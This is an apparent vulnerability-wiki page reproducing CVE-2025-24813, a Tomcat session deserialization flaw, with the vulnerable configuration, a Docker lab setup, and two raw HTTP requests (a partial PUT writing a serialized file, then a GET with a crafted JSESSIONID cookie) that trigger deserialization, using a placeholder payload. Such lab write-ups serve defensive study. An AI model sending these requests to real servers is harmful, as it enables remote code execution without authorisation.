<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Tomcat/CVE-2025-24813/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Tomcat Session Deserialization Remote Code Execution (CVE-2025-24813) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Tomcat Session Deserialization Remote Code Execution (CVE-2025-24813)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Tomcat 远程代码执行漏洞（CVE-2025-24813）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2020-1938/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2020-1938/README.zh-cn/" class="btn btn-xs btn-link">
        Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）
      </a>
    </div>
    
  </div>

    

    <h1 id="tomcat-session-deserialization-remote-code-execution-cve-2025-24813">Tomcat Session Deserialization Remote Code Execution (CVE-2025-24813)<a class="headerlink" href="#tomcat-session-deserialization-remote-code-execution-cve-2025-24813" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache Tomcat is a widely used open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language, and WebSocket technologies.</p>
<p>A deserialization vulnerability was found in Apache Tomcat from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98. It occurs when Tomcat is configured with both writable DefaultServlet (readonly=false) and file-based session persistence. The combination allows attackers to write arbitrary files to the server and trigger deserialization of these files by manipulating the JSESSIONID cookie, ultimately leading to remote code execution.</p>
<ul>
<li><a href="https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq">https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq</a></li>
<li><a href="https://github.com/charis3306/CVE-2025-24813">https://github.com/charis3306/CVE-2025-24813</a></li>
<li><a href="https://forum.butian.net/article/674">https://forum.butian.net/article/674</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following commands to start a vulnerable Tomcat 9.0.97 server:</p>
<div class="highlight"><pre><span></span><code>docker compose build
docker compose up -d
</code></pre></div>
<p>After the server starts, you can access the Tomcat example page by visiting <code>http://your-ip:8080</code>.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>The vulnerability exists due to two key misconfigurations in Tomcat. First, the DefaultServlet is configured with readonly=false, allowing file uploads:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;servlet&gt;</span>
<span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>default<span class="nt">&lt;/servlet-name&gt;</span>
<span class="w">    </span><span class="nt">&lt;servlet-class&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="nt">&lt;/servlet-class&gt;</span>
<span class="w">    </span><span class="nt">&lt;init-param&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-name&gt;</span>debug<span class="nt">&lt;/param-name&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-value&gt;</span>0<span class="nt">&lt;/param-value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/init-param&gt;</span>
<span class="w">    </span><span class="nt">&lt;init-param&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-name&gt;</span>listings<span class="nt">&lt;/param-name&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-value&gt;</span>false<span class="nt">&lt;/param-value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/init-param&gt;</span>
<span class="w">    </span><span class="nt">&lt;init-param&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-name&gt;</span>readonly<span class="nt">&lt;/param-name&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-value&gt;</span>false<span class="nt">&lt;/param-value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/init-param&gt;</span>
<span class="w">    </span><span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
<span class="nt">&lt;/servlet&gt;</span>
</code></pre></div>
<p>Second, Tomcat is configured to use file-based session persistence.</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;Manager</span><span class="w"> </span><span class="na">className=</span><span class="s">&quot;org.apache.catalina.session.PersistentManager&quot;</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;Store</span><span class="w"> </span><span class="na">className=</span><span class="s">&quot;org.apache.catalina.session.FileStore&quot;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/Manager&gt;</span>
</code></pre></div>
<p>Both configurations use the same default storage path: <code>$CATALINA_BASE/work/Catalina/localhost/ROOT</code>.</p>
<p>When sending a partial PUT request, Tomcat converts path separators (/) in the file path to periods (.) and temporarily stores the file in the session storage directory. By crafting a specific request, we can write a malicious serialized object to this directory.</p>
<p>To exploit this vulnerability, first send a partial PUT request with the Content-Range header to write a file named <code>.deserialize.session</code> in the temporary directory (I use the URLDNS gadget for testing purposes):</p>
<div class="highlight"><pre><span></span><code>PUT /deserialize/session HTTP/1.1
Host: your-ip:8080
Content-Length: 1234
Content-Range: bytes 0-5/10

deserialize content
</code></pre></div>
<p><img alt="" src="1.png" /></p>
<p>Then, send another request with a manipulated JSESSIONID cookie to trigger deserialization of the file:</p>
<div class="highlight"><pre><span></span><code>GET / HTTP/1.1
Host: your-ip:8080
Cookie: JSESSIONID=.deserialize
</code></pre></div>
<p><img alt="" src="2.png" /></p>
<p>As you can see, the URLDNS gadget is successfully deserialized, and the DNS request is sent:</p>
<p><img alt="" src="3.png" /></p>
<p>In a real attack scenario, the "deserialize content" would be replaced with a malicious serialized Java object that can execute arbitrary code when deserialized by web applications.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Tomcat 远程代码执行漏洞（CVE-2025-24813）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2020-1938/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2020-1938/README.zh-cn/" class="btn btn-xs btn-link">
        Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>